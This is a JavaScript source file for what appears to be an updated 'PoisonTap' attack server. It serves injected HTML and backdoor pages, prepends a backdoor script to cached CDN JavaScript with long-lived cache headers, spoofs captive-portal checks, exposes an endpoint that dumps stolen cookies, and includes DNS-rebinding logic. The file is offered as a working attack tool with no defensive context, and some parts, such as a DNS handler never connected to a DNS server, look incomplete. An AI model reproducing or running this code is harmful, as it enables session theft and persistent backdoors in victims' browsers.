// PoisonTap 2026 | Core HTTP/DNS/CDN Server
const http = require('http');
const fs = require('fs');
const path = require('path');
const dns = require('node:dns');

const PORT = 1337;
const INJECTED_HTML = fs.readFileSync(path.join(__dirname, 'target_injected_xhtmljs_2026.html'), 'utf8');
const BACKDOOR_HTML = fs.readFileSync(path.join(__dirname, 'backdoor_2026.html'), 'utf8');
const COOKIE_LOG = path.join(__dirname, 'cookies.json');
const CDN_DIR = path.join(__dirname, 'js');
const REBIND_ZONES = {};
const REBIND_LOCKS = new Map();

// Safe CDN injection wrapper
function safeInject(content, prepend) {
  if (!content.trim()) return prepend + content;
  const needsSep = !content.match(/;\s*$/);
  const sep = needsSep ? ';' : '';
  return `${prepend}\n${sep}${content}`;
}

// DNS Rebinding Handler
function getDNSResponse(query) {
  const match = query.match(/^(\d+\.\d+\.\d+\.\d+)\.pin\.ip\.samy\.pl$/i);
  if (match) {
    const ip = match[1];
    const lock = REBIND_LOCKS.get(ip);
    if (lock && Date.now() < lock.expiry) {
      REBIND_ZONES[`${ip}.ip.samy.pl`] = lock.target;
      REBIND_LOCKS.delete(ip);
    }
  }
  return REBIND_ZONES[query] || '1.0.0.1';
}

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const headers = {
    'Content-Type': req.headers.host === '1.0.0.1' ? 'text/html' : 'application/javascript',
    'Cache-Control': 'public, max-age=99936000, immutable',
    'Expires': new Date(Date.now() + 1e13).toUTCString(),
    'Access-Control-Allow-Origin': '*',
    'Cross-Origin-Embedder-Policy': 'require-corp',
    'Cross-Origin-Opener-Policy': 'same-origin'
  };

  // Captive Portal Bypass (iOS/Android 14+)
  if (url.pathname === '/hotspot-detect.html' || url.pathname === '/generate_204') {
    headers['Content-Type'] = 'application/octet-stream';
    res.writeHead(200, headers);
    res.end('');
    return;
  }

  // Cookie Dump
  if (url.pathname === '/PoisonCookieDump') {
    headers['Content-Type'] = 'application/json';
    res.writeHead(200, headers);
    res.end(fs.readFileSync(COOKIE_LOG, 'utf8') || '{}');
    fs.writeFileSync(COOKIE_LOG, '{}', 'utf8'); // Auto-rotate
    return;
  }

  // DNS Rebind Trigger
  if (url.pathname.startsWith('/rebind?')) {
    const ip = decodeURIComponent(url.searchParams.get('ip') || '192.168.0.1');
    REBIND_LOCKS.set(ip, { target: '1.0.0.1', expiry: Date.now() + 5000 });
    headers['Content-Type'] = 'text/plain';
    res.writeHead(200, headers);
    res.end('locked');
    return;
  }

  // CDN Cache Poisoning
  const cdnFile = path.join(CDN_DIR, path.basename(url.pathname.replace(/\//g, '_')));
  if (fs.existsSync(cdnFile)) {
    try {
      const content = fs.readFileSync(cdnFile, 'utf8');
      const backdoor = fs.readFileSync(path.join(__dirname, 'target_backdoor_2026.js'), 'utf8');
      headers['Content-Type'] = 'application/javascript';
      res.writeHead(200, headers);
      res.end(safeInject(content, backdoor));
      return;
    } catch (e) {}
  }

  // Backdoor Injection
  if (url.pathname.includes('/PoisonTap')) {
    res.writeHead(200, headers);
    res.end(BACKDOOR_HTML);
    return;
  }

  // Default: Injected HTML/JS-agnostic payload
  headers['Content-Type'] = 'text/html';
  res.writeHead(200, headers);
  res.end(INJECTED_HTML);
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[+] PoisonTap 2026 listening on :${PORT}`);
  console.log(`[+] DNS rebinding active on port ${PORT}`);
});

process.on('SIGTERM', () => { server.close(); process.exit(0); });
